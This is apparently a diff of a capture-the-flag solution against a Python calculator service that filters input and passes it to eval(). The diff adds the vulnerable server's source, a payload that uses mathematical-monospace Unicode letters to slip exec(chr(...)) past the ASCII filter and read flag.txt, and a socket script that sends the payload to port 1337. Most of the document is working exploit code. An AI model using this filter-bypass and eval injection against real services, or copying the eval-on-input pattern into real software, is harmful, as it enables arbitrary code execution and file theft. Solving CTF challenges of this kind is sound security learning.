@@ -1,3 +1,66 @@
+"""
+Server:
+import re
+from string import ascii_letters, punctuation
+from itertools import chain
+
+def calculate(expression):
+    sanitized_expression = sanitize_input(expression)
+    
+    if not sanitized_expression:
+        return "Invalid expression. Allowed characters: numbers and basic operators."
+
+    print("Calculating: ", sanitized_expression)
+    try:
+        result = eval(sanitized_expression)
+        return result
+    except Exception as e:
+        return f"Error: {e}"
+
+def sanitize_input(expression):
+    dangerous_chars = (ascii_letters + punctuation).translate(str.maketrans("", "", "+-*/%=<>!()"))
+    dangerous_chars += ''.join([chr(x) for x in chain(range(1, 32), range(127, 255))])
+
+    if any(char in expression for char in dangerous_chars):
+        return None
+
+    # Handle the ** operator first to avoid splitting it
+    expression = re.sub(r'(\d)(\*\*)', r'\1 ** ', expression)  # Add space after a digit before **
+    expression = re.sub(r'(\*\*)(\d)', r'** \2', expression)   # Add space before a digit after **
+
+    # Now handle the single operators +, -, *, /
+    expression = re.sub(r'(\d)([+\-*/])', r'\1 \2 ', expression)  # Add space after a digit before an operator
+    expression = re.sub(r'([+\-*/])(\d)', r'\1 \2', expression)   # Add space before a digit after an operator
+    
+    return expression
+
+def main():
+    print("Welcome to the Weak Math Calculation Service!")
+    print("Enter expressions like '2+2' or '5*3'. Be careful, programmers are obsolete!")
+    print("Everything can be done with LLMs.")
+
+    while True:
+        try:
+            # Taking user input from stdin
+            expression = input("Enter your math expression: ").strip()
+
+            if not expression:
+                print("No expression provided. Exiting.")
+                break
+
+            result = calculate(expression)
+
+            print(f"Result: {result}")
+        
+        except (KeyboardInterrupt, EOFError):
+            print("\nExiting...")
+            break
+
+if __name__ == "__main__":
+    main()
+"""
+
+"""
 # funny unicode
 ord("𝚌")
 120460
@@ -229,3 +292,20 @@ convert('print(open("flag.txt").read())')
 
 # nc calc.nc.jctf.pro 1337
 # 𝚎𝚡𝚎𝚌(𝚌𝚑𝚛(112) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(105) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(111) +𝚌𝚑𝚛(112) +𝚌𝚑𝚛(101) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(102) +𝚌𝚑𝚛(108) +𝚌𝚑𝚛(97) +𝚌𝚑𝚛(103) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(120) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(101) +𝚌𝚑𝚛(97) +𝚌𝚑𝚛(100) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(41))
+"""
+
+import socket
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+addr = ('localhost', 1337)
+sock.connect(addr)
+exploit = "𝚎𝚡𝚎𝚌(𝚌𝚑𝚛(112) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(105) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(111) +𝚌𝚑𝚛(112) +𝚌𝚑𝚛(101) +𝚌𝚑𝚛(110) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(102) +𝚌𝚑𝚛(108) +𝚌𝚑𝚛(97) +𝚌𝚑𝚛(103) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(120) +𝚌𝚑𝚛(116) +𝚌𝚑𝚛(34) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(46) +𝚌𝚑𝚛(114) +𝚌𝚑𝚛(101) +𝚌𝚑𝚛(97) +𝚌𝚑𝚛(100) +𝚌𝚑𝚛(40) +𝚌𝚑𝚛(41) +𝚌𝚑𝚛(41))"
+
+sock.recv(4096)
+
+sock.sendall(exploit.encode("utf-8"))
+sock.send(b"\n")
+
+data = sock.recv(4096)
+print(data.decode("utf-8"))
+sock.close()
